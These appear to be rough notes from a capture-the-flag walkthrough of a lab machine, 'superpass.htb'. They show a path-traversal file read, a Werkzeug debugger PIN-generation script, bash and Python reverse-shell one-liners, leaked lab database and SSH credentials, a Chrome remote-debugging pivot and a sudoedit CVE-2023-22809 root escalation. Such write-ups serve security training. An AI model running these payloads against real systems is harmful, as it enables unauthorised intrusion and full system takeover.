```
Nmap scan report for superpass.htb (10.10.11.203)
Host is up (0.067s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
|_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: SuperPassword \xF0\x9F\xA6\xB8
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```


register an account


http://superpass.htb/account/login 	-> Logs in
http://superpass.htb/account/register   -> register



once registered we are redirected on /vault


when we attempt export password there's a download?fn=nome_Utente.csv


```html
GET /download?fn=c0der_export_5e189b8b7f.csv HTTP/1.1
Host: superpass.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: remember_token=13|8698c417d7d6209988a3150be56783965751c1533f6ce66e22cb04b48fca8aa34c0ed83b671e15d0e3547823ffcf10c608adf13be78c08637a7d0052f4ba455d; session=.eJwlzjsOwjAMANC7ZGZw7Dhxepkq_gnWlk6Iu1OJd4L3KXsecT7L9j6ueJT95WUraEKjCeiM2pA1pgKjEGTAmiMkmVQBVjfPsdSZyDPdwTtDLICYSGYMNw624YvEsKsMaki8CJHTiRaBYyJWtUjhpiwDarkj1xnHf1OpfH_tyy86.ZFStwA.NmS5PicNV-Lr2qQGRV85YCkWSFU
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
```







## LFI Vulnerability found





lfi in download?fn=../app/app/superpass/views/vault_views.py  --- app.py

 
/download?fn=../app/venv/lib/python3.10/site-packages/werkzeug/debug/__init__.py 


this reveal a werkezeug debugger 






## CONSOLE

http://superpass.htb/download?fn=app does not exist and point on werkezeug debugger


```
Console Locked

The console is locked and needs to be unlocked by entering the PIN. You can find the PIN printed out on the standard output of your shell that runs the server. 
```


found this [article](https://github.com/wdahlenburg/werkzeug-debug-console-bypass) which explain how to recover the pin trought LFI 



`/proc/net/arp` reveals which interface is hosting the web app



`/sys/class/net/eth0/address`

1) MAC : 00:50:56:b9:47:0c

>>> "".join("00:50:56:b9:47:0c".split(":"))


Convert from hex address to decimal representation by running in python 
>>> print(0x005056b9470c)


345052366604




2) /etc/machine-id ed5b159560f54721827644bc9b220d00

3) boot_id dd9ae1bc-c58b-4dc3-a39e-01ebd04a8440



use the exploit and insert into debug mode !

```py
#!/usr/bin/env python3
import os
import hashlib
from itertools import chain

def genpin(modname, appname):
    pin = os.environ.get("WERKZEUG_DEBUG_PIN")
    rv = None
    num = None

    if pin is not None and pin.replace("-", "").isdecimal():
        if "-" in pin:
            rv = pin
        else:
            num = pin

    probably_public_bits = [
        'www-data',  # username
#        'flask.app',  # modname
        modname,
#        'Flask',  # getattr(app, '__name__', type(app).__name__)
        appname,
        '/app/venv/lib/python3.10/site-packages/flask/app.py'  # getattr(mod, '__file__', None)
    ]

    private_bits = [
        '345052366604',    # str(uuid.getnode())...MAC address
        'ed5b159560f54721827644bc9b220d00superpass.service'  # get_machine_id()...machine-id
    ]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    #return rv
    print(rv)

def main():
    modnames = ['flask.app', 'werkzeug.debug']
    appnames = ['wsgi_app', 'DebuggedApplication', 'Flask']

    for mod in modnames:
        for app in appnames:
            genpin(mod, app)

if __name__ == '__main__':
    main()  

```
## PIN

765-848-989




use genpin to gen pin werkzeug debuggger 

now get shell is pretty simple 

https://exploit-notes.hdks.org/exploit/web/framework/python/werkzeug-pentesting/

```py
__import__('os').popen('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"').read()

```


sql pass in /app/config_prod.json 
`{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}`


so in mysql we can find user and password 


```
+----+---------------------+-------
| username | password             |
+----+---------------------+-------
| 0xdf     | 762b430d32eea2f12970 |
| 0xdf     | 5b133f7a6a1c180646cb |
| corum    | 47ed1e73c955de230a1d |
| corum    | 9799588839ed0f98c211 |
| corum    | 5db7caa1d13cc37c9fc2 |
+----+---------------------+-------

```



## ssh creds 

corum : 5db7caa1d13cc37c9fc2

in /opt/ find google/chrome 

we are lucky couse 

ps -eaf --forest | grep chrome 

reveals debug 

`\_ chromedriver --port=41829`


ssh corum@10.10.11.203 -L 41829:127.0.0.1:41829


and go on chrome://inspect once configured on that port find a remote target that is the chrome of the machine 




## chrome exploits edwards password 

edwards : d07867c6267dcb5df0af


## Privilega Escalation

sudo -l reveals 

```bash
User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt

```


I can't venv activate but i remember that's a tool for that so [pspy64](https://github.com/DominicBreuker/pspy) can do it without root permission




and then i found the sodo version affected to https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc/blob/main/exploit.sh

CVE-2023-22809



with export EDITOR="vim -- /app/venv/bin/activate" 

we can craft the json .... and python3 reverse shell can give the root permission!


## Payload json


```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

`sudo -u dev_admin sudoedit /app/config_test.json`














